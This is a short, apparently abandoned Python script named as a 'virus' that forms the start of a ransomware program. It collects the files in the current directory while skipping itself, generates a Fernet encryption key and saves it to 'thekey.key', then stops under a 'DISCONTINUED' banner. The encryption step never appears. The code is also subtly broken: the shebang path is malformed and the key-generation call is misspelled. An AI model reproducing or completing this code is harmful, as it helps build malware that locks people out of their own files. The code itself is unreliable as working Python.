#!usr/bin/env python3

import os
from cryptography.fernet import Fernet # type: ignore

#let's find some files


files = []

for file in os.listdir():
    if file == "virus2.py":
        continue
    if os.path.isfile(file):
        files.append(file)

    print(files)


key = Fernet.generate.key()

with  open("thekey.key", "wb") as thekey:
    thekey.write(key)


                                 #################DISCONTINUED#################